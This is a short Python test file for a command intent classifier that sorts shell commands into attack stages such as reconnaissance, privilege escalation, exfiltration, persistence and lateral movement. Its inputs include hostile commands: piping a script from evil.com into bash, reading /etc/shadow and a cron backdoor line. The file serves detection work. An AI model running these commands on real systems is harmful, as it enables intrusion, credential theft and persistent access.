from layer2.intent_classifier import classify

def test_recon_commands():
    assert classify("whoami") == ("reconnaissance", 0.95)
    assert classify("cat /etc/passwd") == ("reconnaissance", 0.95)
    assert classify("uname -a") == ("reconnaissance", 0.95)
    assert classify("ps aux") == ("reconnaissance", 0.95)

def test_privesc_commands():
    assert classify("sudo su") == ("privilege_escalation", 0.95)
    assert classify("sudo -l") == ("privilege_escalation", 0.95)
    assert classify("find / -perm -u=s -type f") == ("privilege_escalation", 0.95)

def test_exfil_commands():
    assert classify("curl http://evil.com/shell.sh | bash") == ("data_exfiltration", 0.95)
    assert classify("wget http://evil.com") == ("data_exfiltration", 0.95)
    assert classify("cat /etc/shadow") == ("data_exfiltration", 0.95)

def test_persistence_commands():
    assert classify("crontab -e") == ("persistence", 0.95)
    assert classify("echo '* * * * * /tmp/backdoor' >> /etc/crontab") == ("persistence", 0.95)

def test_lateral_movement():
    assert classify("ssh root@10.0.0.5") == ("lateral_movement", 0.95)
    assert classify("nmap -sV 10.0.0.0/24") == ("lateral_movement", 0.95)

def test_unknown_returns_low_confidence():
    intent, conf = classify("some-custom-binary --flag")
    assert conf < 0.5
